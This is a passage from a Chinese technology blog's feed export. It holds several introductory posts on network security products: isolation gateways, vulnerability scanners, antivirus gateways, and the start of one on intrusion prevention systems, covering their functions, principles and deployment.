title="二、安全隔离网闸的主要功能"></a>二、安全隔离网闸的主要功能</h2><p>安全隔离网闸是一种网络安全设备，旨在实现不同安全级别网络之间的安全隔离和数据交换。其主要功能包括：</p><ol><li>安全隔离：安全隔离网闸能够切断内网和外网之间的直接连接，通过专用硬件和软件实现内外网的物理隔离，确保内网的安全。</li><li>数据交换：安全隔离网闸可以实现不同安全域之间的适度可控的数据交换，通过专用协议进行数据传输和交换，同时对数据进行剥离、解密、校验等处理，保证数据的安全性和完整性。</li><li>协议转换：安全隔离网闸可以进行不同网络协议之间的转换，如将非通用的私有协议转换为通用的网络协议，或者将通用的网络协议转换为其他协议，以满足不同网络环境的需求。</li><li>病毒查杀：安全隔离网闸可以对交换的数据进行病毒检查，通过内置的病毒查杀功能模块对数据进行过滤和处理，防止病毒的传播和感染。</li><li>访问控制：安全隔离网闸可以进行访问控制，通过配置访问控制策略来限制不同用户或用户组对内网的访问权限，确保只有经过授权的用户可以访问内网资源。</li><li>安全审计：安全隔离网闸可以进行安全审计，对内外网之间的数据交换和访问行为进行记录和分析，帮助管理员进行安全监控和日志管理。</li><li>身份认证：安全隔离网闸可以进行身份认证，通过用户名、密码、数字证书等方式对用户进行身份验证，确保只有经过身份认证的用户可以访问内网资源。</li></ol><p>安全隔离网闸可以有效地保护网络免受潜在的安全威胁，确保数据的安全性和完整性。</p><h2 id="三、安全隔离网闸的工作原理"><a href="#三、安全隔离网闸的工作原理" class="headerlink" title="三、安全隔离网闸的工作原理"></a>三、安全隔离网闸的工作原理</h2><p>其工作原理是通过专用硬件在电路上切断网络之间的链路层连接，形成物理隔离，从而能够在网络间进行安全适度的应用数据交换。安全隔离网闸通常由三个基本部分组成：内网处理单元、外网处理单元和隔离与交换控制单元（隔离硬件）。其中，内网处理单元负责处理内网的数据，外网处理单元负责处理外网的数据，而隔离与交换控制单元则负责在内外网之间建立一个安全的数据交换通道，以实现数据的传输和交换。</p><p><strong>1、内网处理单元</strong><br>内网处理单元包括内网接口单元与内网数据缓冲区。接口部分负责与内网的连接，并终止内网用户的网络连接，对数据进行病毒检测、防火墙、入侵防护等安全检测后剥离出“纯数据”，作好交换的准备，也完成来自内网对用户身份的确认，确保数据的安全通道；数据缓冲区是存放并调度剥离后的数据，负责与隔离交换单元的数据交换。</p><p><strong>2、外网处理单元</strong><br>外网处理单元与内网处理单元功能相同，但处理的是外网连接。</p><p><strong>3、隔离与交换控制单元（隔离硬件）</strong><br>隔离与交换控制单元（隔离硬件）是网闸隔离控制的摆渡控制，控制交换通道的开启与关闭。控制单元中包含一个数据交换区，就是数据交换中的摆渡船。对交换通道的控制的方式目前有两种技术，摆渡开关与通道控制。摆渡开关是电子倒换开关，让数据交换区与内外网在任意时刻的不同时连接，形成空间间隔GAP，实现物理隔离。通道方式是在内外网之间改变通讯模式，中断了内外网的直接连接，采用私密的通讯手段形成内外网的物理隔离。该单元中有一个数据交换区，作为交换数据的中转。 </p><p>其中，三个单元都要求其软件的操作系统是安全的，也就是采用非通用的操作系统，或改造后的专用操作系统。一般为Unix BSD或Linux的经安全精简版本，或者其他是嵌入式操作系统等，但都要对底层不需要的协议、服务删除，使用的协议优化改造，增加安全特性，同时提高效率。</p><p>如果针对网络七层协议，安全隔离网闸是在硬件链路层上断开。</p><p>安全隔离网闸的部署方式一般是在两套网络之间，它可以实现物理隔离，阻断网络中的TCP等协议，使用私有协议进行数据交换。在对网络要求稍微高一些的单位，如政府、军队、公安、银行等，通常会用到安全隔离网闸来确保网络安全。</p><h2 id="四、安全隔离网闸的分类"><a href="#四、安全隔离网闸的分类" class="headerlink" title="四、安全隔离网闸的分类"></a>四、安全隔离网闸的分类</h2><p>隔离网闸的主要类型包括硬件隔离网闸和软件隔离网闸。<br><strong>硬件隔离网</strong>闸通常是一种独立的设备，它通过物理隔离的方式对网络进行安全保护，具有较高的安全性和稳定性。这种网闸通过专用安全隔离切换装置（数据暂存区）、内部处理单元和外部处理单元等硬件组成部分，在任一时刻仅连通内部或外部处理单元，从而实现内外网的安全隔离。<br>而<strong>软件隔离网闸</strong>则是一种基于软件的安全隔离技术，它可以通过虚拟化、隔离容器等技术对网络进行安全隔离，具有较高的灵活性和可控性。这种网闸通常不需要额外的硬件设备，而是在现有的计算机系统中通过软件实现网络隔离和数据交换。</p><p>此外，根据应用场景和需求的不同，隔离网闸还可以分为不同的类型，例如单向隔离网闸和双向隔离网闸。<br><strong>单向隔离网闸</strong>的数据流是单向的，也就是说，数据只能从一个方向流动，不能从另一个方向流动。这通常是为了确保网络的安全性，防止潜在的安全威胁和数据泄露。<br>而<strong>双向隔离网</strong>闸则是双向可流动的，也就是说，数据可以从内网流向外网，也可以从外网流向内网。这种类型的网闸通常用于需要频繁进行数据交换的场景，例如政府部门、金融行业等。</p><h2 id="五、安全隔离网闸与防火墙的区别"><a href="#五、安全隔离网闸与防火墙的区别" class="headerlink" title="五、安全隔离网闸与防火墙的区别"></a>五、安全隔离网闸与防火墙的区别</h2><p>安全隔离网闸与防火墙是两种不同的网络安全设备，它们的主要区别在于应用场景、硬件架构和功能等方面。<br>首先，应用场景方面，防火墙主要用于保护内部网络免受外部网络的攻击和入侵，它通常部署在内部网络和外部网络之间，确保内网的安全性。而安全隔离网闸则主要用于实现不同安全域之间的安全隔离和数据交换，它通常部署在两个或多个安全域之间，确保不同安全域之间的数据传输和交换的安全性。</p><p>其次，硬件架构方面，防火墙是单主机架构，通过软件来实现安全功能，早期的防火墙采用包过滤技术，现代的防火墙则采用更高级的技术如代理技术和UTM等。而安全隔离网闸则是双主机架构，通过硬件和软件结合的方式实现安全功能，它包括内网处理单元、外网处理单元和隔离与交换控制单元等部分。</p><p>此外，功能方面，防火墙主要用于过滤和监测网络流量，识别和防御各种网络威胁，保证网络通信的安全性。而安全隔离网闸则除了可以过滤和监测网络流量外，还可以实现不同安全域之间的安全隔离和数据交换，保证不同安全域之间数据传输的安全性和可控性。</p><p>防火墙和安全隔离网闸是两种不同的网络安全设备，它们在应用场景、硬件架构和功能等方面存在明显的区别。在实际应用中，可以根据具体的需求选择适合的网络安全设备来实现网络安全防护。</p><h2 id="四、安全隔离网闸的应用场景"><a href="#四、安全隔离网闸的应用场景" class="headerlink" title="四、安全隔离网闸的应用场景"></a>四、安全隔离网闸的应用场景</h2><p>安全隔离网闸的应用场景主要包括以下几个方面：</p><ol><li>涉密网络与非涉密网络之间：安全隔离网闸能够实现涉密网络与非涉密网络之间的物理隔离，确保涉密信息的安全。这种应用场景在政府、军队、公安等需要处理敏感信息的机构中非常常见。</li><li>局域网与互联网之间（内网与外网之间）：对于一些局域网络，特别是政府办公网络，有时需要与互联网在物理上断开，以保证网络的安全性。安全隔离网闸可以在需要时连接内外网，实现数据的安全交换。</li><li>办公网与业务网之间：由于办公网络与业务网络的信息敏感程度不同，例如银行的办公网络和银行业务网络。为了提高工作效率，办公网络有时需要与业务网络交换信息。安全隔离网闸可以实现两类网络的物理隔离，保证业务网络的安全。</li><li>电子政务的内网与专网之间：在电子政务系统建设中，要求政府内网与外网之间用逻辑隔离，而在政府专网与内网之间用物理隔离。安全隔离网闸是实现这种物理隔离的常用设备。</li><li>业务网与互联网之间：例如电子商务网络一边连接着业务网络服务器，一边通过互联网连接着广大民众。安全隔离网闸可以在业务网与互联网之间建立一道安全屏障，防止来自互联网的潜在威胁。</li></ol><p>此外，安全隔离网闸还可用来隔离保护主机服务器或专门隔离保护数据库服务器。在需要保证高安全级别的网络环境中，如政府、军队、公安、银行、工商、航空、电力和电子商务等，安全隔离网闸都有着广泛的应用。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全产品之认识漏洞扫描设备</title>
      <link href="/posts/2a24dc00/"/>
      <url>/posts/2a24dc00/</url>
      
        <content type="html"><![CDATA[<p>漏洞是指在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而使攻击者能够在未授权的情况下访问或破坏系统。关于什么是漏洞及如何管理漏洞请参考《<a href="http://xiejava.ishareread.com/posts/a937cbf5/" target="_blank" rel="noopener">安全运营之漏洞管理</a>》。漏洞的形成原因有很多，例如后门、程序员自身的素质、网络协议等都可能导致漏洞的产生。因此，为了保障系统的安全性，需要及时发现和修复漏洞。这可以通过漏洞扫描设备等工具进行自动化检测和修复，同时也可以加强安全意识和培训，提高人员的安全防范能力。虽然无法完全避免漏洞的存在，但通过采取有效的措施可以大大减少漏洞的数量和危害程度，保障系统的安全性和稳定性。本文让我们一起来认识漏洞扫描设备。</p><h2 id="一、什么是漏洞扫描设备"><a href="#一、什么是漏洞扫描设备" class="headerlink" title="一、什么是漏洞扫描设备"></a>一、什么是漏洞扫描设备</h2><p>漏洞扫描设备是一种用于对企业网络进行漏洞扫描的专业硬件设备。它能够自动检测远程或本地计算机系统的安全脆弱性，发现可利用的漏洞，并提供相应的修复建议。漏洞扫描设备基于漏洞数据库，通过扫描等手段对指定的计算机系统进行安全检测，从而发现系统中的安全漏洞。其主要功能包括对网站、系统、数据库、端口、应用软件等网络设备进行智能识别扫描检测，并对其检测出的漏洞进行报警提示管理人员进行修复。同时，漏洞扫描设备还可以对漏洞修复情况进行监督并自动定时对漏洞进行审计，提高漏洞修复效率。</p><p>漏洞扫描设备在网络安全领域中发挥着重要的作用。它可以及时发现和修复网络中存在的安全漏洞，提高系统的安全性，降低被攻击的风险。在实际使用中，可以根据需要选择合适的扫描技术和工具，以最大程度地保障网络安全。</p><h2 id="二、漏洞扫描设备的主要功能"><a href="#二、漏洞扫描设备的主要功能" class="headerlink" title="二、漏洞扫描设备的主要功能"></a>二、漏洞扫描设备的主要功能</h2><p>漏洞扫描设备是网络安全产品中的一种重要设备，用于自动检测和评估网络中的漏洞和弱点。漏洞扫描设备可以对网站、系统、数据库、端口、应用软件等一些网络设备应用进行智能识别扫描检测，并对其检测出的漏洞进行报警提示管理人员进行修复。同时可以对漏洞修复情况进行监督并自动定时对漏洞进行审计提高漏洞修复效率。以下是漏洞扫描设备的主要功能和特点：</p><ol><li>漏洞检测：漏洞扫描设备能够对网络中的各种设备和系统进行自动化的漏洞检测，包括操作系统、数据库、网络设备、应用程序等。它通过模拟攻击者的行为来尝试利用各种漏洞，并记录下目标系统的反应，以判断是否存在漏洞。</li><li>脆弱性评估：漏洞扫描设备能够对目标系统的脆弱性进行评估，识别出可能被攻击者利用的漏洞和弱点。它还能够提供详细的漏洞描述和影响范围，帮助管理员及时了解系统存在的安全风险。</li><li>实时监测：漏洞扫描设备可以实时监测网络中的异常行为和恶意攻击，及时发现并阻止潜在的入侵行为。它还可以与防火墙、入侵检测系统等其他安全设备进行联动，共同构建起强大的安全防护体系。</li><li>报告生成：漏洞扫描设备能够生成详细的漏洞报告，列出已检测到的漏洞信息和修复建议。这些报告可以帮助管理员快速了解系统的安全状况，并制定相应的修复计划。</li><li>自动化修复：一些高端的漏洞扫描设备还具备自动化的修复功能，能够自动安装补丁或配置安全设置，以消除检测到的漏洞。这大大提高了漏洞修复的效率和安全性。</li></ol><p>漏洞扫描设备是网络安全体系中不可或缺的一部分。通过使用漏洞扫描设备，企业可以及时发现和修复网络中的漏洞和弱点，提高系统的安全性，降低被攻击的风险。</p><h2 id="三、漏洞扫描设备的主要技术"><a href="#三、漏洞扫描设备的主要技术" class="headerlink" title="三、漏洞扫描设备的主要技术"></a>三、漏洞扫描设备的主要技术</h2><p>当前，网络安全漏洞扫描技术的两大核心技术是端口扫描技术和漏洞扫描技术。<br>端口扫描技术主要是通过扫描目标主机的网络端口，了解目标主机上开放的网络服务，从而发现可能存在的安全漏洞。端口扫描技术可以帮助网络管理员了解目标主机的网络服务状态和安全风险，常见的端口扫描方法包括TCP扫描、UDP扫描和操作系统探测等。</p><p>漏洞扫描技术则是基于漏洞数据库和漏洞检测工具，通过模拟攻击者的攻击方式对目标系统进行漏洞检测的技术。漏洞扫描技术能够检测出目标系统中可能存在的安全漏洞，如缓冲区溢出、SQL注入、跨站脚本攻击等。</p><p>端口扫描技术主要关注目标主机的网络服务状态和安全风险，而漏洞扫描技术则通过模拟攻击者的攻击方式来检测目标系统中可能存在的安全漏洞。具体包括：</p><ol><li>主机扫描：确定在目标网络上的主机是否在线。</li><li>端口扫描：发现远程主机开放的端口以及服务。</li><li>OS识别技术：根据信息和协议栈判别操作系统。</li><li>漏洞检测数据采集技术：按照网络、系统、数据库进行扫描。</li><li>智能端口识别、多重服务检测、安全优化扫描、系统渗透扫描。</li><li>多种数据库自动化检查技术，数据库实例发现技术。</li></ol><p>在实际使用中，可以根据需要选择合适的扫描技术和工具，以最大程度地保障网络安全。</p><h2 id="四、漏洞扫描设备的主要类型"><a href="#四、漏洞扫描设备的主要类型" class="headerlink" title="四、漏洞扫描设备的主要类型"></a>四、漏洞扫描设备的主要类型</h2><ol><li>针对网络的扫描器：基于网络的扫描器就是通过网络来扫描远程计算机中的漏洞。价格相对来说比较便宜；在操作过程中，不需要涉及到目标系统的管理员，在检测过程中不需要在目标系统上安装任何东西；维护简便。</li><li>针对主机的扫描器：基于主机的扫描器则是在目标系统上安装了一个代理或者是服务，以便能够访问所有的文件与进程，这也使得基于主机的扫描器能够扫描到更多的漏洞。</li><li>针对数据库的扫描器：数据库漏洞扫描系统可以检测出数据库的DBMS漏洞、缺省配置、权限提升漏洞、缓冲区溢出、补丁未升级等自身漏洞。</li><li>Web应用扫描器：专门用于扫描Web应用程序的漏洞，例如SQL注入、跨站脚本（XSS）和跨站请求伪造（CSRF）等，可以模拟攻击者的行为，识别应用程序中的漏洞并生成报告。</li><li>移动应用扫描器：用于扫描移动应用程序中的漏洞和安全问题，可以检测移动应用中的API漏洞、不安全的数据存储和未加密的通信等问题。</li></ol><h2 id="五、漏洞扫描设备的使用方式"><a href="#五、漏洞扫描设备的使用方式" class="headerlink" title="五、漏洞扫描设备的使用方式"></a>五、漏洞扫描设备的使用方式</h2><ul><li>独立式部署：在网络中只部署一台漏扫设备，接入网络并进行正确的配置即可正常使用，其工作范围通常包含用户企业的整个网络地址。用户可以从任意地址登录漏扫系统并下达扫描评估任务，检查任务的地址必须在产品和分配给此用户的授权范围内。</li><li>多级式部署：对于一些大规模和分布式网络用户，建议使用分布式部署方式。在大型网络中采用多台漏扫系统共同工作，可对各系统间的数据共享并汇总，方便用户对分布式网络进行集中管理。</li></ul><h2 id="六、漏洞扫描设备如何与其他安全设备联动"><a href="#六、漏洞扫描设备如何与其他安全设备联动" class="headerlink" title="六、漏洞扫描设备如何与其他安全设备联动"></a>六、漏洞扫描设备如何与其他安全设备联动</h2><p>漏洞扫描设备可以通过多种方式与其他安全设备进行联动，以提高安全防护的效果。以下是漏洞扫描设备与其他安全设备联动的几种常见方式：</p><ol><li>防火墙联动：漏洞扫描设备可以与防火墙进行联动，将扫描结果与防火墙的规则进行匹配，实现对漏洞的自动隔离和修复。例如，当漏洞扫描设备检测到某个主机存在高危漏洞时，可以向防火墙发送指令，暂时关闭该主机的网络访问，直到漏洞被修复为止。</li><li>入侵检测系统（IDS）联动：漏洞扫描设备可以与IDS进行联动，将扫描结果与IDS的规则进行匹配，实现实时监测和报警。当IDS检测到异常行为或攻击时，可以向漏洞扫描设备发送指令，进行进一步的检测和响应。</li><li>Web应用防火墙（WAF）联动：对于Web应用漏洞的扫描，漏洞扫描设备可以与WAF进行联动。当WAF检测到恶意请求或攻击时，可以向漏洞扫描设备发送指令，进行进一步的检测和响应。同时，WAF还可以将扫描结果与自身的规则进行匹配，实现自动过滤和防御。</li><li>身份认证系统联动：漏洞扫描设备可以与身份认证系统进行联动，实现对用户的身份认证和访问控制。通过将扫描结果与身份认证系统的用户信息进行匹配，可以实现对用户访问权限的精细控制，提高系统的安全性。</li><li>安全信息和事件管理（SIEM）系统联动：漏洞扫描设备可以与SIEM系统进行联动，将扫描结果和安全事件信息统一纳入SIEM系统中进行集中管理和分析。通过SIEM系统，管理员可以全面了解网络的安全状况，并及时采取相应的措施进行处置。</li></ol><p>漏洞扫描设备与其他安全设备的联动可以实现信息共享、协同防御和快速响应的效果。通过将不同安全设备的优势结合起来，可以构建起更加完善和强大的安全防护体系。</p><h2 id="七、漏洞扫描设备的应用场景"><a href="#七、漏洞扫描设备的应用场景" class="headerlink" title="七、漏洞扫描设备的应用场景"></a>七、漏洞扫描设备的应用场景</h2><ul><li>定期的网络安全自我检测、评估<br>通过漏洞扫描设备进行安全检测可帮助客户最大可能的消除安全隐患，尽可能早地发现安全漏洞并进行修补，有效的利用已有系统，提高网络的运行效率。</li><li>安装新软件、启动新服务后的检查<br>由于漏洞和安全隐患的形式多种多样，安装新软件和启动新服务都有可能使原来隐藏的漏洞暴露出来，因此进行这些操作之后应该重新扫描系统，才能使安全得到保障。</li><li>网络安全事故后的分析调查<br>网络安全事故后可以通过网络漏洞扫描/网络评估系统分析确定网络被攻击的漏洞所在，帮助弥补漏洞，尽可能多得提供资料方便调查攻击的来源。</li><li>重大网络安全事件前的准备<br>重大网络安全事件前网络漏洞扫描/网络评估系统能够帮助用户及时的找出网络中存在的隐患和漏洞，帮助用户及时的弥补漏洞。可以对网站、系统、数据库、端口、应用软件等一些网络设备应用进行智能识别扫描检测，并对其检测出的漏洞进行报警提示管理人员进行修复。同时可以对漏洞修复情况进行监督并自动定时对漏洞进行审计提高漏洞修复效率。</li></ul><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全产品之认识防毒墙</title>
      <link href="/posts/974e9e0f/"/>
      <url>/posts/974e9e0f/</url>
      
        <content type="html"><![CDATA[<p>在互联网发展的初期，网络结构相对简单，病毒通常利用操作系统和软件程序的漏洞发起攻击，厂商们针对这些漏洞发布补丁程序。然而，并不是所有终端都能及时更新这些补丁，随着网络安全威胁的不断升级和互联网的普及，病毒往往能够轻易地感染大量计算机。在这样的背景下，防毒墙应运而生。<br>接下来让我们认识一下防毒墙。</p><h2 id="一、什么是防毒墙"><a href="#一、什么是防毒墙" class="headerlink" title="一、什么是防毒墙"></a>一、什么是防毒墙</h2><p>防毒墙是一种网络安全设备，通常部署在网络的入口处，用于对网络传输中的病毒进行过滤。通俗地说，防毒墙可以部署在企业局域网和互联网交界的地方，阻止病毒从互联网侵入内网。防毒墙通过多种技术手段来检测和过滤病毒，包括启发式分析、特征码匹配、行为分析、人工智能等。它能够识别和阻止各种类型的病毒，包括文件病毒、宏病毒、蠕虫病毒、木马病毒等。防毒墙主要体现在病毒杀除的功能，同时部分设备也具有关键字过滤（如色情、反动）、垃圾邮件阻止和一定防火墙的功能。</p><h2 id="二、防毒墙主要功能"><a href="#二、防毒墙主要功能" class="headerlink" title="二、防毒墙主要功能"></a>二、防毒墙主要功能</h2><p>1、专注病毒过滤，阻断病毒传输，工作协议层为ISO的2-7层，分析数据包中的传输数据内容，运用病毒分析技术处理病毒体，具有防火墙访问控制功能模块<br>2、基于网络层过滤病毒，主动防御病毒于网络之外；网关设备配置病毒过滤策略，方便、扼守咽喉；过滤出入网关的数据；与杀毒软件联动建立多层次反病毒体系。<br>3、内容过滤，防毒墙可以对网络流量中的内容进行过滤，如禁止不适当的网站、阻止恶意邮件等。<br>4、部分设备也具有一定防火墙，能够检测进出网络内部的数据，对http、ftp、SMTP、IMAP和POP3五种协议的数据进行病毒扫描，一旦发现病毒就会采取相应的手段进行隔离或查杀，在防护病毒方面起到了非常大的作用。</p><h2 id="三、防毒墙的工作原理"><a href="#三、防毒墙的工作原理" class="headerlink" title="三、防毒墙的工作原理"></a>三、防毒墙的工作原理</h2><p>防毒墙是一种专门设计用于检测和阻止网络传输中的病毒和其他恶意软件的网络安全设备。它的工作原理主要涉及以下几个步骤：</p><ol><li>智能感知引擎：防毒墙首先通过智能感知引擎对网络流量进行深层分析，识别出流量对应的协议类型和文件传输的方向。这一步是为了判断文件传输所使用的协议和文件传输的方向是否支持病毒检测。</li><li>特征提取与匹配：一旦流量被识别并经过初步筛选，防毒墙会进行特征提取。提取后的特征与防毒墙中的病毒特征库进行匹配。如果匹配成功，则认为该文件为病毒文件，并按照配置文件中的响应动作进行处理。</li><li>白名单机制：为了提高反病毒的检测效率，防毒墙支持白名单机制。管理员可以为信任的域名、URL、IP地址或IP地址段配置白名单规则。对于命中白名单的流量，防毒墙将不会对其进行病毒检测。</li><li>联动检测功能：为了增强病毒检测的准确性，对于未命中病毒特征库的文件，防毒墙具备联动检测功能。通过将文件送入沙箱进行深度检测，进一步提高对未知病毒的防范能力。</li><li>日志系统：防毒墙还提供日志系统，用于定位感染源。通过分析日志数据，管理员可以追踪病毒的来源，及时发现并处理安全威胁。</li></ol><p>防毒墙通过上述步骤对网络流量进行实时检测和过滤，旨在阻止病毒和其他恶意软件的传播，保护企业网络的安全。</p><h2 id="四、防毒墙的查杀方式"><a href="#四、防毒墙的查杀方式" class="headerlink" title="四、防毒墙的查杀方式"></a>四、防毒墙的查杀方式</h2><p>防毒墙的查杀方式主要包括特征码技术和行为查杀技术两种。</p><ol><li>特征码技术：防毒墙通过病毒特征库来识别病毒，特征库包含了各种病毒的特征码。当防毒墙扫描到被检测信息与特征库中的特征码匹配时，就认为该被检测信息为病毒。特征码技术是传统的病毒查杀方式，准确率高，但是对新病毒的应对能力较差。</li><li>行为查杀技术：当病毒在运行的时候会有各种行为特征，比如会在系统里增加有特殊后缀的文件，监控用户行为等。防毒墙通过监控病毒的行为特征，当检测到某被检测信息有这些特征行为时，则认为该被检测信息为病毒。行为查杀技术对新病毒的应对能力强，但是误报率较高。</li></ol><p>在实际应用中，防毒墙通常会结合使用这两种技术，以提高病毒的查杀效果。同时，防毒墙也会不断更新病毒库和升级引擎，以应对不断变化的病毒威胁。</p><p>防毒墙通过多种技术手段来识别高危险性的安全漏洞。以下是一些常用的技术：</p><ol><li>漏洞扫描：防毒墙具备漏洞扫描功能，可以定期或实时地对网络中的终端设备进行漏洞扫描，检查操作系统、应用程序等是否存在已知的漏洞。一旦发现漏洞，防毒墙会立即发出警报，并采取相应的措施进行修复或隔离。</li><li>威胁情报：防毒墙通过收集和分析威胁情报数据，了解最新的病毒、恶意软件、黑客组织等信息，从而发现高危险性的安全漏洞。防毒墙会将这些情报数据与网络流量进行比对，一旦发现异常行为或可疑数据，就会立即进行拦截和清除。</li><li>行为分析：防毒墙通过监控网络流量中病毒的行为特征，可以识别出高危险性的安全漏洞。例如，某些病毒会在系统里增加有特殊后缀的文件、监控用户行为等。防毒墙通过分析这些行为特征，一旦发现可疑行为，就会立即采取相应的措施进行处置。</li><li>人工智能技术：防毒墙采用人工智能技术，通过机器学习和深度学习算法，不断学习和分析网络流量中的数据特征，从而识别出高危险性的安全漏洞。人工智能技术可以自动识别未知病毒、恶意软件等威胁，并采取相应的措施进行拦截和清除。</li></ol><h2 id="五、防毒墙的使用方式"><a href="#五、防毒墙的使用方式" class="headerlink" title="五、防毒墙的使用方式"></a>五、防毒墙的使用方式</h2><p>1、透明模式：串联接入网络出口处，部署简单。<br>2、旁路代理模式：强制客户端的流量经过防病毒网关，防病毒网关仅仅需要处理要检测的相关协议，不需要处理其他协议的转发，可以较好的提高设备性能。<br>3、旁路模式：与旁路代理模式部署的拓扑一样，不同的是，旁路模式只能起到检测作用，对于已检测到的病毒无法做到清除。</p><h2 id="六、防毒墙的应用场景"><a href="#六、防毒墙的应用场景" class="headerlink" title="六、防毒墙的应用场景"></a>六、防毒墙的应用场景</h2><p>防毒墙的应用场景主要包括以下几个方面：</p><ol><li>保护内部终端免受来自互联网的病毒攻击：对于无法保证内网所用终端全部安装杀毒软件或存在安全漏洞的企业，防毒墙可以部署在网关处，阻挡病毒从互联网进入内网，保护内网终端的安全。</li><li>控制病毒在网络之间爆发传播：大型网络中可能存在多个单位网络互联的情况，一个单位的病毒爆发可能会引发整个大网络的病毒传播。防毒墙可以部署在各单位网络边缘，严格控制病毒在网络之间的传播，防止大规模的病毒爆发。</li><li>保护重点服务器：随着服务器的广泛应用，防毒墙可以部署在网络出口处及接在重点服务器前，保护企业上网和服务器不受病毒入侵。</li><li>隔离外来不安全终端：当外来人员在企业内网进行访问互联网时，可能会携带病毒。在隔离区出口处部署防毒墙可以保护内部终端安全。</li><li>U盘感染终端控制：U盘是病毒传播的重要途径之一。使用防毒墙可以帮助企业建立U盘安全区，当U盘安全使用区计算机含有病毒访问企业内部资源时，防毒墙进行病毒的过滤。</li><li>阻止内网终端对外部不良资源的滥用：防毒墙可以对网络流量中的内容进行过滤，如禁止不适当的网站、阻止恶意邮件等，从而防止内部用户滥用外部不良资源。</li></ol><p>防毒墙适用于各种复杂的网络拓扑环境，可以根据用户的不同需要，具备针对HTTP、FTP、SMTP和POP3协议内容检查、清除病毒的能力，同时通过实施安全策略可以在网络环境中的内外网之间建立一道功能强大的防火墙体系。</p><h2 id="七、防毒墙与防火墙"><a href="#七、防毒墙与防火墙" class="headerlink" title="七、防毒墙与防火墙"></a>七、防毒墙与防火墙</h2><p>防毒墙与防火墙虽然只有一个字不同，但是他们是两种不同的网络安全产品，主要区别在于防护的侧重点和功能。<br>防火墙主要关注网络层的安全，通过IP地址、端口号等网络层面信息来判断是否允许数据包通过，从而防止非法访问和攻击。防火墙通常部署在网络的入口处，对所有进出的网络流量进行过滤和防护。</p><p>防毒墙则主要关注应用层的安全，通过对网络流量中的数据进行深度检测和过滤，来防止计算机病毒、蠕虫、特洛伊木马等恶意软件的传播。防毒墙通常部署在网络出口处，对所有进出的网络流量进行实时检测和过滤。</p><p>防火墙和防毒墙都是非常重要的网络安全产品，在实际应用中可以根据具体情况选择部署。同时，为了确保网络安全，还需要结合其他安全措施，如加密技术、身份认证等，来提高整个网络的安全性。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全产品之认识入侵防御系统</title>
      <link href="/posts/ff1920f8/"/>
      <url>/posts/ff1920f8/</url>
      
        <content type="html"><![CDATA[<p>由于网络安全威胁的不断演变和增长。随着网络技术的不断发展和普及，网络攻击的种类和数量也在不断增加，给企业和个人带来了巨大的安全风险。传统的防火墙、入侵检测防护体系等安全产品在面对这些威胁时，存在一定的局限性和不足，无法满足当前网络安全的需求。入侵防御系统(IPS)作为一种主动防御的解决方案应运而生。它可以实时检测和防御网络流量中的恶意攻击和威胁，通过串接的方式部署在网络中，对入侵行为进行实时阻断，从而极大地降低了入侵的危害。入侵防御系统（IPS）的出现弥补了传统安全产品的不足，为网络安全提供了更加全面和有效的防护方案。前面介绍了入侵检测系统（IDS）《<a href="http://xiejava.ishareread.com/posts/e5ea6795/" target="_blank" rel="noopener">网络安全产品之认识入侵检测系统</a>》，本文我们来认识一下入侵防御系统（IPS）。</p><h2 id="一、什么是入侵防御系统"><a href="#一、什么是入侵防御系统" class="headerlink" title="一、什么是入侵防御系统"></a>一、什么是入侵防御系统</h2><p><strong>入侵防御系统（IPS）</strong> 是一种网络安全设施，主要用于监测和防御网络或系统活动中存在的恶意攻击和威胁。IPS能够监视网络流量和系统活动，检测已知和未知的攻击行为，一旦发现威胁，会立即启动防御机制，采取相应的措施来阻止或减轻攻击的影响。IPS倾向于提供主动防护，其设计宗旨是预先对入侵活动和攻击性网络流量进行拦截，避免其造成损失，而不是简单地在恶意流量传送时或传送后才发出警报。能够在保护网络和计算机系统免受攻击方面发挥强大的作用。</p><h2 id="二、入侵防御系统的主要功能"><a href="#二、入侵防御系统的主要功能" class="headerlink" 